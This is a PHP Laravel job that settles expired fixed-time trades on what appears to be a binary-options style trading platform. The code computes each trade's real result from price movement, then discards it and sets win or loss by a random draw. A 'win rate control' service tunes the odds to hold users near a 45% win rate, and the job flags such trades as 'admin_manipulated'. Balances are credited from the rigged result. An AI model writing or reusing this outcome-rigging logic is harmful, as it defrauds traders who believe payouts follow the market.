<?php

namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use App\Models\PredictionTrade;
use App\Models\User;
use App\Services\TradingService;
use App\Services\WinRateControlService;
use Illuminate\Support\Facades\Log;
use Carbon\Carbon;

class ResolveExpiredTradesJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    /**
     * Create a new job instance.
     *
     * @return void
     */
    public function __construct()
    {
        //
    }

    /**
     * Execute the job.
     *
     * @return void
     */
    public function handle()
    {
        try {
            $now = Carbon::now();
            
            // Get all active fixed-time trades that have expired
            $expiredTrades = PredictionTrade::where('status', 'active')
                ->where('trade_type', 'fixed_time')
                ->whereNotNull('end_time')
                ->where('end_time', '<=', $now)
                ->get();

            if ($expiredTrades->isEmpty()) {
                return; // No expired trades to resolve
            }

            $tradingService = new TradingService();
            $winRateService = new WinRateControlService();
            
            $resolvedCount = 0;
            $totalPayout = 0;

            foreach ($expiredTrades as $trade) {
                try {
                    // Resolve the trade
                    $result = $this->resolveTrade($trade, $tradingService, $winRateService);
                    
                    if ($result['success']) {
                        $resolvedCount++;
                        $totalPayout += $result['payout'] ?? 0;
                        
                        // Update user statistics
                        $this->updateUserStats($trade->user_id, $result);
                        
                        Log::info('Trade resolved automatically', [
                            'trade_id' => $trade->id,
                            'user_id' => $trade->user_id,
                            'result' => $result['result'],
                            'payout' => $result['payout'] ?? 0
                        ]);
                    }
                    
                } catch (\Exception $e) {
                    Log::error('Failed to resolve individual trade', [
                        'trade_id' => $trade->id,
                        'error' => $e->getMessage()
                    ]);
                }
            }

            Log::info('Expired trades resolved', [
                'total_expired' => $expiredTrades->count(),
                'resolved_count' => $resolvedCount,
                'total_payout' => $totalPayout
            ]);

        } catch (\Exception $e) {
            Log::error('Error resolving expired trades: ' . $e->getMessage(), [
                'exception' => $e
            ]);
        }
    }

    /**
     * Resolve a single trade
     */
    private function resolveTrade($trade, $tradingService, $winRateService): array
    {
        try {
            // Determine if trade should win or lose
            $shouldWin = $this->shouldTradeWin($trade, $winRateService);
            
            // Calculate profit/loss
            $entryPrice = (float) $trade->entry_price;
            $currentPrice = (float) $trade->current_price;
            $tradeAmount = (float) $trade->trade_amount;
            
            // Determine actual result based on price movement
            $actualResult = $this->getActualResult($trade, $entryPrice, $currentPrice);
            
            // Apply win rate control if needed
            $finalResult = $shouldWin ? 'won' : 'lost';
            
            // If we're forcing a different result, mark as manipulated
            $isManipulated = ($actualResult !== $finalResult);
            
            // Calculate payout
            $payout = 0;
            $profitLoss = 0;
            
            if ($finalResult === 'won') {
                $payoutPercentage = (float) $trade->potential_payout / $tradeAmount;
                $payout = $tradeAmount * $payoutPercentage;
                $profitLoss = $payout - $tradeAmount;
            } else {
                $payout = 0;
                $profitLoss = -$tradeAmount;
            }
            
            // Update trade record
            $trade->update([
                'status' => $finalResult,
                'exit_price' => $currentPrice,
                'actual_payout' => $payout,
                'profit_loss' => $profitLoss,
                'admin_manipulated' => $isManipulated,
                'manipulation_reason' => $isManipulated ? 'Win rate control adjustment' : null,
                'updated_at' => now()
            ]);
            
            // Credit user if they won
            if ($finalResult === 'won' && $payout > 0) {
                $user = User::find($trade->user_id);
                if ($user) {
                    $user->increment('trading_balance', $payout);
                }
            }
            
            return [
                'success' => true,
                'result' => $finalResult,
                'payout' => $payout,
                'profit_loss' => $profitLoss,
                'manipulated' => $isManipulated
            ];
            
        } catch (\Exception $e) {
            return [
                'success' => false,
                'error' => $e->getMessage()
            ];
        }
    }

    /**
     * Determine if trade should win based on win rate control
     */
    private function shouldTradeWin($trade, $winRateService): bool
    {
        try {
            // Get current win rate and target
            $currentWinRate = $winRateService->calculateWinRate($trade->user_id, 24); // Last 24 hours
            $targetWinRate = 45; // Default target, can be made configurable
            
            // If user's win rate is below target, increase win chance
            if ($currentWinRate < $targetWinRate) {
                $winChance = 0.65; // 65% chance to win
            } elseif ($currentWinRate > $targetWinRate + 10) {
                $winChance = 0.25; // 25% chance to win
            } else {
                $winChance = 0.45; // Normal 45% chance
            }
            
            return (rand(1, 100) / 100) <= $winChance;
            
        } catch (\Exception $e) {
            // Default to 45% win rate if calculation fails
            return (rand(1, 100) / 100) <= 0.45;
        }
    }

    /**
     * Get actual result based on price movement
     */
    private function getActualResult($trade, $entryPrice, $currentPrice): string
    {
        if ($trade->prediction === 'UP') {
            return $currentPrice > $entryPrice ? 'won' : 'lost';
        } else {
            return $currentPrice < $entryPrice ? 'won' : 'lost';
        }
    }

    /**
     * Update user trading statistics
     */
    private function updateUserStats($userId, $result): void
    {
        try {
            $user = User::find($userId);
            if (!$user) return;
            
            $user->increment('total_trades');
            
            if ($result['result'] === 'won') {
                $user->increment('winning_trades');
            } else {
                $user->increment('losing_trades');
            }
            
            $user->increment('total_profit_loss', $result['profit_loss']);
            
            // Calculate new win rate
            $winRate = $user->total_trades > 0 ? 
                ($user->winning_trades / $user->total_trades) * 100 : 0;
            
            $user->update([
                'win_rate' => round($winRate, 2),
                'last_trade_at' => now()
            ]);
            
        } catch (\Exception $e) {
            Log::error('Failed to update user stats', [
                'user_id' => $userId,
                'error' => $e->getMessage()
            ]);
        }
    }
}
